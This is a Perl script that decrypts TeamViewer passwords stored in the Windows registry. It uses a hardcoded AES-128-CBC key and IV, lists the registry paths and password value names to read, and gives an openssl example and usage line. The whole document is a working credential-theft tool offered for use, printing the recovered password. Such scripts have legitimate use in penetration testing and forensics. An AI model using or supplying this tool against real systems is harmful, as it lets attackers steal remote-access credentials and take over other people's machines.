#!/usr/bin/perl

###################################################################################
# smiler
# ------
# TeamViewer stored user passwords encrypted with AES-128-CBC with key:
# 0602000000a400005253413100040000 and iv:0100010067244F436E6762F25EA8D704 
# in the Windows registry:
# "HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version7", "Version"
# "HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version8", "Version"
# "HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version9", "Version"
# "HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version10", "Version"
# "HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version11", "Version"
# "HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version12", "Version"
# "HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version13", "Version"
# "HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version14", "Version"
# "HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version15", "Version"
# "HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer", "Version"
# "HKLM\\SOFTWARE\\TeamViewer\\Temp", "SecurityPasswordExported"
# "HKLM\\SOFTWARE\\TeamViewer", "Version"
#
# -> OptionsPasswordAES, SecurityPasswordAES, SecurityPasswordExported, 
#    ServerPasswordAES, ProxyPasswordAES, LicenseKeyAES
#
# output example from registry: 
# 491160245babae25de666b732a4c2dd43558d45f7feb200c83b2c509c92dc8f3
#
# echo -n 'SuperMotDePasseAdmin' | openssl enc -aes-128-cbc -K \\ 
# 0602000000a400005253413100040000 -iv 0100010067244F436E6762F25EA8D704 | xxd -p
# -> 491160245babae25de666b732a4c2dd43558d45f7feb200c83b2c509c92dc8f3
#
# usage : $ perl teamviewer_decrypt.pl 491160245babae25de666b732a4c2dd43558d45f7 \\
# feb200c83b2c509c92dc8f3
#
###################################################################################

use Crypt::CBC;

chomp (my $encoded = pack("H*", $ARGV[0]));

my $key = pack("H32", "0602000000a400005253413100040000");
my $iv = pack("H32", "0100010067244F436E6762F25EA8D704");

my $cipher = Crypt::CBC->new(
  -literal_key => 1,
  -key => $key,
  -keysize => 16,
  -iv => $iv,
  -cipher => 'Crypt::Cipher::AES',
  -header => 'none'
);

my $decyphered = $cipher->decrypt($encoded);
print "Le mot de passe est : $decyphered\n";
